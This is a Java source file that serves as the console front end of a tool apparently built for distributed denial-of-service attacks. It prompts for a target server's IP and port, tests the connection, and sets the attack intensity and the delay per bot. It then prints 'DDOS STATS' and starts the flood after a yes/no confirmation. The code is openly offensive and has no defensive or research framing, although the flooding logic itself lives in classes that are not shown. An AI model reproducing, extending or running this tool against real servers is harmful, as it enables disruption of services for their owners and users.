package src.Main.DDosSoftware.EntryPoint;

import java.lang.reflect.Field;
import java.util.Scanner;

import src.Main.DDosSoftware.DDosLogic.Client.ClientPacketManager;
import src.Main.DDosSoftware.DDosLogic.Flood.DDoSManager;
import src.Main.DDosSoftware.DDosLogic.Server.ServerManager;
import src.Main.DDosSoftware.Enums.Intensity;

/**
 * <p>
 * Get data from user to prepare the DDoS
 * </p>
 */
public class GUI {
    private Scanner scan = new Scanner(System.in);
    public static DDoSManager DDoS;

    private GUI() {
        ServerManager.bindIPAndPort(getIP(), getPort());
        System.out.println();

        if (ServerManager.connectionTest()) {
            System.out
                    .println("The IP and PORT is working properly, continuing to next step...\n");

            DDoS = new DDoSManager().setIntensity(getIntensity()).setDelayTime(getDelayTime());
            ClientPacketManager.generateRandomPacket();

            printDDoSInfo();

            if (doubleCheck()) {
                DDoS.start();
            } else {
                System.out.println("Stopping the program...");
                System.exit(0);
            }
        } else {
            System.out.println("Failed to connect to the IP and PORT that you provided, please try again...");
        }
    }

    public static GUI start() {
        return new GUI();
    }

    public String getIP() {
        System.out.print("Server's IP: ");
        return scan.nextLine().toUpperCase();
    }

    public int getPort() {
        System.out.print("Server's PORT: ");
        return scan.nextInt();
    }

    public Intensity getIntensity() {
        scan.nextLine();
        System.out.println("Intensity: ");
        for (Field field : Intensity.class.getFields()) {
            System.out.println("+ " + field.getName());
        }
        System.out.print("Choose the intensity: ");
        String intense = scan.nextLine().toUpperCase();
        if (intense == null || intense.equalsIgnoreCase("")) {
            return Intensity.valueOf("LOW");
        } else {
            return Intensity.valueOf(intense.toUpperCase());
        }
    }

    public long getDelayTime() {
        System.out.println();
        System.out.print("Delay time per bot (in miliseconds): ");
        String delayTime = scan.nextLine();
        if (delayTime == null || delayTime.equalsIgnoreCase("")) {
            return DDoSManager.DEFAULT_DELAY_TIME;
        } else {
            return Long.parseLong(delayTime);
        }
    }

    public void printDDoSInfo() {
        System.out.println("<===========> DDOS STATS <===========>");
        System.out.println("\n");

        System.out.println("SERVER'S IP: " + ServerManager.getIp().getHostAddress());
        System.out.println("SERVER'S PORT: " + ServerManager.getPort());
        System.out.println("DDoS INTENSITY: " + DDoS.getIntensity());
        System.out.println("DELAY TIME PER BOT: " + (double) DDoS.getDelayTime() / 1000 + "s/bot");
        System.out.println("PACKET'S SIZE: " + ClientPacketManager.packetList.size());

        System.out.println("\n");
        System.out.println("<===========> DDOS STATS <===========>");
    }

    public boolean doubleCheck() {
        System.out.println();
        System.out.print("ARE YOU READY? (Y/N): ");
        String yesOrNo = scan.nextLine();
        if (yesOrNo.equalsIgnoreCase("yes") || yesOrNo.equalsIgnoreCase("y") || yesOrNo.equalsIgnoreCase("")) {
            return true;
        } else {
            return false;
        }

    }
}
